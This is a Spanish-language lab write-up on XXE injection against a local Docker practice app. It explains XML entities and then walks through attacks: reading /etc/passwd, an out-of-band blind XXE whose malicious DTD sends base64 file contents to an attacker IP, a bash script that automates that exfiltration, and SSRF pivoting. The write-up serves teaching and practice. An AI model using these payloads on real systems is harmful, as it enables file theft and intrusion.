---
title: "[Lab] XML External Entity Injection (XXE)"
date: 2023-12-25
categories: [OWASPTop10]
tags: [owasptop10, hacking, xml]
---



# XML External Entity Injection (XXE)


## Instalación

```bash
git clone https://github.com/jbarone/xxelab.git
cd xxelab
docker build -t xxelab .
docker run -dit --rm -p 127.0.0.1:5000:80 xxelab
```

Una vez instalado, se verifican los contenedores corriendo y que el port-forwarding esté funcionando, luego se ingresa a la dirección: http://localhost:5000/

## ¿Qué es XML?

![Untitled](../assets/OWASP-TOP-10/XML External Entity Injection (XXE)/Untitled.png)

XML, siglas de "Extensible Markup Language" (Lenguaje de Marcado Extensible), es un formato de lenguaje de marcado utilizado para almacenar y transportar datos de manera legible tanto para humanos como para máquinas.

XML se basa en etiquetas que permiten estructurar y organizar la información de manera jerárquica. Estas etiquetas se utilizan para definir elementos y atributos que describen los datos contenidos. Por ejemplo, un elemento puede ser un nombre, una fecha o cualquier otro tipo de información.

La principal utilidad de XML es permitir el intercambio de datos entre diferentes sistemas de forma independiente del hardware o software utilizado. Al ser un formato flexible y legible, se utiliza ampliamente en la transferencia de información entre aplicaciones y sistemas heterogéneos.

![Untitled](../assets/OWASP-TOP-10/XML External Entity Injection (XXE)/Untitled 1.png)

El atacante tramita una petición con una estructura XML y el servidor responde con información

## Petición XML

En esta ocasión, se tiene un panel de logueo que se ve de esta forma:

![Untitled](../assets/OWASP-TOP-10/XML External Entity Injection (XXE)/Untitled 2.png)

Así se ve la petición interceptada por Burpsuite en la cual se puede ver una estructura XML:

![Untitled](../assets/OWASP-TOP-10/XML External Entity Injection (XXE)/Untitled 3.png)

En este caso, al enviarse la petición, el servidor lee el tag “email” y devuelve una respuesta en el que incluye el dato leído

## ¿Qué es una entidad?

![Untitled](../assets/OWASP-TOP-10/XML External Entity Injection (XXE)/Untitled 4.png)

![Untitled](../assets/OWASP-TOP-10/XML External Entity Injection (XXE)/Untitled 5.png)

Es una **referencia** a un **conjunto de caracteres** con un nombre específico. Puede representar tanto caracteres individuales como bloques de texto más largos. Las entidades se definen utilizando una declaración de entidad y se utilizan para representar contenido especial o caracteres reservados en un documento XML.

Existen dos tipos principales de entidades en XML: las entidades predefinidas y las entidades definidas por el usuario.

1. Entidades predefinidas: XML tiene cinco entidades predefinidas que representan caracteres especiales:
    - **`&amp;`** representa el signo "&".
    - **`&lt;`** representa el símbolo "<".
    - **`&gt;`** representa el símbolo ">".
    - **`&quot;`** representa la comilla doble ".
    - **`&apos;`** representa la comilla simple '.
    - Ejemplos
        
        Entidades predefinidas:
        
        - Uso de **`&amp;`**:
            
            Si quieres incluir el símbolo "&" literalmente en un texto sin que sea interpretado como el inicio de una entidad, debes utilizar la entidad predefinida **`&amp;`**. Al escribir **`&amp;`** en tu documento XML, se mostrará el símbolo "&" en el resultado final.
            
            Por ejemplo, si deseas incluir el texto "A & B" en un elemento de tu documento XML, deberías escribirlo de la siguiente manera:
            
            ```bash
            <texto>A &amp; B</texto>
            ```
            
            El resultado será:
            
            ```bash
            A & B
            ```
            
            De esta manera, el símbolo "&" se muestra correctamente en el texto sin ser interpretado como el inicio de una entidad.
            
        - Uso de **`&lt;`** y **`&gt;`**:
            
            ```bash
            <texto>Esto es un ejemplo de etiqueta &lt;etiqueta&gt;</texto>
            ```
            
            En este caso, se utiliza la entidad **`&lt;`** para representar el símbolo **`<`** y la entidad **`&gt;`** para representar el símbolo **`>`**. Esto **evita que la etiqueta dentro del texto sea interpretada como una etiqueta real** y se muestre correctamente.
            
    
    Estas entidades predefinidas **se utilizan para evitar que los caracteres especiales se confundan con la sintaxis de XML** y se interpreten incorrectamente.
    
    - Consideración
        
        En muchos casos, puedes utilizar los caracteres especiales directamente en el texto sin necesidad de utilizar las entidades predefinidas correspondientes. Cuando escribes **`"`** y **`'`** dentro del texto, se interpretarán correctamente sin necesidad de utilizar **`&quot;`** y **`&apos;`**.
        
        Las entidades **`&lt;`**, **`&quot;`** y **`&apos;`** están destinadas a ser utilizadas cuando necesitas representar esos caracteres especiales de manera explícita o cuando puedes tener ambigüedad en la interpretación del texto.
        
        Por ejemplo, si deseas incluir el texto "Esto es un ejemplo de una etiqueta <etiqueta> y comillas 'simples' y "dobles"" dentro de un elemento XML, podrías escribirlo de las siguientes maneras:
        
        1. Utilizando las entidades predefinidas:
        
        ```bash
        <texto>Esto es un ejemplo de una etiqueta &lt;etiqueta&gt; y comillas &apos;simples&apos; y &quot;dobles&quot;</texto>
        ```
        
        1. Utilizando los caracteres especiales directamente:
        
        ```bash
        <texto>Esto es un ejemplo de una etiqueta <etiqueta> y comillas 'simples' y "dobles"</texto>
        ```
        
        Ambas formas son válidas y mostrarán el mismo resultado. En este caso particular, puedes utilizar los caracteres especiales sin ambigüedad.
        
    
2. Entidades definidas por el usuario: Además de las entidades predefinidas, es posible definir entidades personalizadas en un documento XML. Las entidades definidas por el usuario se declaran en el DTD (Documento de Tipo de Documento) o en un archivo de esquema XML. Estas entidades pueden representar cualquier conjunto de caracteres y se utilizan para definir símbolos o elementos específicos que se utilizan en el documento.
    - Ejemplos
        - Definición de entidad:
            
            ```bash
            <!DOCTYPE documento [
              <!ENTITY nombreEntidad "Esto es el contenido de la entidad">
            ]>
            <documento>
              <contenido>&nombreEntidad;</contenido>
            </documento>
            ```
            
            En este ejemplo, se define una entidad llamada "nombreEntidad" que contiene el texto "Esto es el contenido de la entidad". Luego, se utiliza la referencia de entidad **`&nombreEntidad;`** dentro del elemento **`<contenido>`** para insertar el contenido de la entidad en el documento.
            
        - Uso de entidad para un símbolo especial:
            
            ```bash
            <!DOCTYPE documento [
              <!ENTITY euroSymbol "€">
            ]>
            <documento>
              <precio>&euroSymbol;19.99</precio>
            </documento>
            ```
            
            Aquí, se define una entidad llamada "euroSymbol" que representa el símbolo del euro "€". Luego, se utiliza la referencia de entidad **`&euroSymbol;`** dentro del elemento **`<precio>`** para mostrar el símbolo del euro seguido del precio.
            

Por ejemplo, supongamos que en un documento XML se necesita utilizar el símbolo del euro (€) repetidamente. En lugar de escribir el símbolo del euro directamente en el documento, se puede definir una entidad llamada "euro" que representa el símbolo del euro. Luego, cada vez que se necesite el símbolo del euro, se puede utilizar la referencia de entidad "€" en su lugar.

## Estructura XML

![Untitled](../assets/OWASP-TOP-10/XML External Entity Injection (XXE)/Untitled 6.png)

```bash
<?xml version="1.0" enconding="UTF-8">
<!DOCTYPE foo  [<!ENTITY xxe SYSTEM "miUnidad">]>

<Profesores>
	<Nombre>S4vitar</Nombre>
	<Edad>27</Edad>
	<Rol>Lammer</Rol>
</Profesores>
```

1. **`<?xml version="1.0" encoding="UTF-8"?>`**: Esta línea es la declaración XML y se encuentra al comienzo del documento. Indica que se trata de un archivo XML y especifica la versión de XML utilizada (1.0) y la codificación de caracteres (UTF-8) que se utiliza para el documento.
2. **`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "miUnidad">]>`**: Esta línea define la declaración de tipo de documento (DTD) para el documento XML. La DTD especifica la estructura y el conjunto de reglas que el documento XML debe seguir. En este caso, se define un tipo de documento llamado "foo". Dentro de la declaración de tipo de documento, se encuentra una declaración de entidad llamada "xxe". Esta entidad es definida usando la palabra clave **`ENTITY`** y está enlazada a un archivo o recurso externo llamado "miUnidad". Esta entidad se puede referenciar en el contenido del documento XML utilizando la sintaxis **`&xxe;`**.
    
    El parámetro **`SYSTEM`** se utiliza en la declaración de entidad para especificar un archivo o recurso externo al que la entidad está enlazada. En el ejemplo  **`<!ENTITY xxe SYSTEM "miUnidad">`**, "miUnidad" es la referencia al archivo o recurso externo que contiene el valor de la entidad.
    

Además del parámetro **`SYSTEM`**, también existe el parámetro **`PUBLIC`** que se utiliza para especificar una identificación pública (como una URL) para el recurso externo asociado a la entidad.

## Reglas para etiquetas

En XML, el nombre de las etiquetas, también conocidas como elementos, puede ser cualquier cosa siempre y cuando siga ciertas reglas de nomenclatura. Estas reglas son:

1. El nombre de la etiqueta debe comenzar con una letra o un carácter de subrayado (_).
2. El resto del nombre de la etiqueta puede contener letras, dígitos, guiones medios (-), puntos (.) y dos puntos (:).
3. El nombre de la etiqueta no puede contener espacios en blanco ni caracteres especiales como signos de puntuación o símbolos.

Al seguir estas reglas, puedes crear nombres de etiquetas personalizados y descriptivos según el contenido que desees representar en tu documento XML.

## Ataque XXE

### Identificar vulnerabilidad a XXE

Ahora, sabiendo que el servidor lee el campo “email” de la estructura XML, se modificará la petición para crear una entidad llamada “xxe” la cual se hará referencia en el campo “email”:

![Untitled](../assets/OWASP-TOP-10/XML External Entity Injection (XXE)/Untitled 7.png)

Se envió la petición y el servidor respondió correctamente con el contenido de la entidad (”ejemplo”) y es aquí en donde entra el XXE.

### XXE: Apuntar a un archivo interno de la máquina víctima

Se hace uso de SYSTEM para apuntar al archivo interno de la máquina /etc/passwd utilizando el wrapper “file://” 

![Untitled](../assets/OWASP-TOP-10/XML External Entity Injection (XXE)/Untitled 8.png)

## Ataque XXE OOB Blind: External DTD (Out of Band Interaction)

Hay veces en las que al intentar listar archivos internos con entidades, el output no se muestre en la respuesta, por lo que se puede intentar hacer el ataque a “ciegas” cargando un archivo externo “.dtd” malicioso de la máquina del atacante

![Untitled](../assets/OWASP-TOP-10/XML External Entity Injection (XXE)/Untitled 9.png)

![Untitled](../assets/OWASP-TOP-10/XML External Entity Injection (XXE)/Untitled 10.png)

```bash
# External DTD
<?xml version="1.0" encoding="UTF-8">
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 
"http://<IPAtacante>/malicious.dtd"> %xxe;]>

# Estructura XML...
```

Si no se puede declarar la entidad en la estructura XML, se puede crear una entidad de parámetro en el mismo DTD llamando a esa entidad (”xxe”), es por eso que se está llamando al %xxe en la entidad.

```bash
# malicious.dtd
<!ENTITY % file SYSTEM 
"php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval 
"<!ENTITY &#x25; exfil SYSTEM 'http://<IPAtacante/?file=%file;'>">
%eval;
%exfil;
```

Como se está declarando una entidad dentro de otra entidad, el porcentaje de se debe poner de la siguiente forma: &#x25;

También hay que tomar en cuenta que se deben cargar todas las entidades para que funcionen, es por eso que al final se llaman a la “eval” y “exfil”, la “file” ya está cargándose en la segunda entidad por lo que no es necesario especificarla al final.

- ¿Para qué sirve “%” (entidad de parámetro)?
    
    El "%" se utiliza para definir una entidad de parámetro llamada "%xxe;" que está vinculada a la ubicación "http://<IPAtacante>/malicious.dtd". Luego, se hace referencia a esta entidad de parámetro utilizando "%xxe;" dentro de la declaración de tipo de documento (DTD).
    
    El uso de "%" para declarar una entidad de parámetro dentro del DTD y luego hacer referencia a esa entidad con "%nombreentidad;" es similar a referenciar una entidad en la estructura XML utilizando "&entidad;".
    
    Tanto en el DTD como en la estructura XML, el objetivo es proporcionar un mecanismo para reutilizar y referenciar contenido definido previamente. La diferencia radica en el contexto en el que se utilizan estas referencias:
    
    - Dentro del DTD: Se utilizan "%" y "%nombreentidad;" para definir y hacer referencia a entidades de parámetro en el DTD. Estas entidades se utilizan para definir estructuras y reglas adicionales relacionadas con la validación y la definición de tipos de datos dentro del DTD.
    - Dentro de la estructura XML: Se utiliza "&entidad;" para hacer referencia a entidades definidas previamente en el DTD o en la entidad general del documento XML. Estas referencias se utilizan para insertar contenido específico en el documento XML y pueden incluir caracteres especiales, entidades predefinidas o entidades definidas por el usuario.
    
    En resumen, "%" y "%nombreentidad;" se utilizan para referenciar entidades de parámetro en el DTD, mientras que "&entidad;" se utiliza para referenciar entidades dentro de la estructura XML en sí. Ambas formas permiten la reutilización de contenido y facilitan la estructuración y el procesamiento del documento XML.
    

El objetivo es que el servidor se mande una petición a sí mismo para que busque el archivo “/etc/passwd” en su máquina local y lo convierta en base64 para que luego lo mande con una petición por GET a la dirección del atacante:

![XXE OBB para que el servidor cargue un archivo malicioso](../assets/OWASP-TOP-10/XML External Entity Injection (XXE)/Untitled 11.png)

XXE OBB para que el servidor cargue un archivo malicioso

![Archivo malicioso que cargará el servidor](../assets/OWASP-TOP-10/XML External Entity Injection (XXE)/Untitled 12.png)

Archivo malicioso que cargará el servidor

![Resultado de petición por GET del servidor al atacante con el base64](../assets/OWASP-TOP-10/XML External Entity Injection (XXE)/Untitled 13.png)

Resultado de petición por GET del servidor al atacante con el base64

![Resultado base64 decodificado](../assets/OWASP-TOP-10/XML External Entity Injection (XXE)/Untitled 14.png)

Resultado base64 decodificado

### Script automatizado

- Script para automatizar el XXE OOB Blind
    
    ```bash
    #!/bin/bash
    
    echo -ne "\n[+] Insert file to read: " && read -r myFilename
    
    # Estructura del archivo malicioso
    malicious_dtd="""
    <!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=$myFilename\">
    <!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://192.168.0.110/?file=%file;'>\">
    %eval;
    %exfil;"""
    
    echo $malicious_dtd > malicious.dtd
    
    # Tramitar la petición
    python3 -m http.server 80 &>wpdkogfnefi &
    
    PID=$!
    
    sleep 1
    
    curl -s -X POST "http://localhost:5000/process.php" -d '<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://192.168.0.110/malicious.dtd"> %xxe;]>
    <root><name>bryan</name><tel>8888</tel><email>hola</email><password>123</password></root>' &>/dev/null
    
    # Filtrar base64 y decodificarlo
    cat wpdkogfnefi | grep -oP 'file=\K[^.*]+\s' | base64 -d 2>/dev/null
    
    kill -9 $PID
    wait $PID 2>/dev/null
    
    rm wpdkogfnefi 2>/dev/null # El nombre es random para que no elimine archivos futuros
    ```
    

## Evasión de firewall

![Untitled](../assets/OWASP-TOP-10/XML External Entity Injection (XXE)/Untitled 15.png)

Al igual que en las XSS, es posible trasformar este ataque en un SSRF y desde el lado del servidor, tramitar peticiones a sí mismo por un puerto no accesible externamente, por ejemplo el 8080, luego esa respuesta mandarla, con otra entidad, a la máquina del atacante en base64 y así conseguir más información de la cual no se es accesible externamente.
